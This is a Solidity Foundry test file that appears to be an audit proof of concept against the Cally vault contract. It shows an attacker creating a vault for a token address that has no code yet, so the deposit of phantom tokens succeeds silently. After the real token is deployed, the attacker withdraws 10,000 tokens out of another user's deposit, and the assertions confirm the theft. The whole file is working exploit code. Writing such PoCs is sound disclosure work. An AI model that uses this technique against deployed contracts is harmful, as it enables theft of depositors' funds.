pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {Cally} from "src/Cally.sol";
import "openzeppelin/token/ERC20/ERC20.sol";

contract SimpleERC20 is ERC20 {
    constructor() ERC20("Token", "TKN") {}

    // anyone can mint for simplicity in the test environment
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract ExploitTest is Test {
    Cally cally;

    address attacker = address(0xA11CE);
    address alice = address(0xB0B);
    address tokenAddr; // placeholder for the yet-to-be-deployed token

    uint256 constant ATTACKER_VAULT_AMOUNT = 10_000 ether;
    uint256 constant ALICE_VAULT_AMOUNT = 11_000 ether;

    function setUp() public {
        // give both parties some ETH for tx fees
        vm.deal(attacker, 100 ether);
        vm.deal(alice, 100 ether);

        // deploy Cally
        cally = new Cally();

        // choose a deterministic address that currently has *no* code
        tokenAddr = address(0x111122223333444455556666777788889999AAAa);
        assertEq(tokenAddr.code.length, 0, "token address already has code");

        /************************************************
         *  (1) Attacker plants a fake vault beforehand *
         ***********************************************/
        vm.startPrank(attacker);

        // premiumIndex 0, durationDays 1, starting strike index 0, reserve strike 0.5 ether (< 1 ether requirement)
        uint256 attackerVaultId = cally.createVault(
            ATTACKER_VAULT_AMOUNT,
            tokenAddr,
            0,
            1,
            0,
            0.5 ether,
            Cally.TokenType.ERC20
        );
        vm.stopPrank();

        /************************************************
         *  (2) Legit project deploys the real ERC20    *
         ***********************************************/
        // deploy a real ERC20 implementation somewhere else
        SimpleERC20 realTokenImpl = new SimpleERC20();
        bytes memory runtimeCode = address(realTokenImpl).code;

        // upload the runtime code to the pre-chosen address (simulates later deployment)
        vm.etch(tokenAddr, runtimeCode);
        assertGt(tokenAddr.code.length, 0, "code upload failed");

        // cast the address to SimpleERC20 interface
        SimpleERC20 token = SimpleERC20(tokenAddr);

        // mint tokens to Alice so she can create a legitimate vault
        token.mint(alice, ALICE_VAULT_AMOUNT);

        /************************************************
         *  (3) Alice creates her vault legitimately    *
         ***********************************************/
        vm.startPrank(alice);
        token.approve(address(cally), ALICE_VAULT_AMOUNT);

        uint256 aliceVaultId = cally.createVault(
            ALICE_VAULT_AMOUNT,
            tokenAddr,
            0,
            1,
            0,
            0.5 ether,
            Cally.TokenType.ERC20
        );
        vm.stopPrank();

        // Cally now holds Alice's 11,000 tokens
        assertEq(token.balanceOf(address(cally)), ALICE_VAULT_AMOUNT, "Cally should hold Alice's tokens");

        /************************************************
         *  (4) Attacker withdraws and steals 10,000    *
         ***********************************************/
        vm.startPrank(attacker);
        cally.initiateWithdraw(attackerVaultId);

        // need timestamp > currentExpiration (set to creation time). Warp by 1 second.
        vm.warp(block.timestamp + 1);
        cally.withdraw(attackerVaultId);
        vm.stopPrank();

        /************************************************
         *  (5) Assertions – exploit succeeded          *
         ***********************************************/
        // Attacker received his phantom 10,000 tokens
        assertEq(token.balanceOf(attacker), ATTACKER_VAULT_AMOUNT, "Attacker did not receive stolen tokens");

        // Cally only has 1,000 tokens left (11,000 – 10,000)
        assertEq(token.balanceOf(address(cally)), ALICE_VAULT_AMOUNT - ATTACKER_VAULT_AMOUNT, "Incorrect Cally balance");

        // Alice’s vault is under-collateralised – if she tries to withdraw, she will be short-changed
    }
}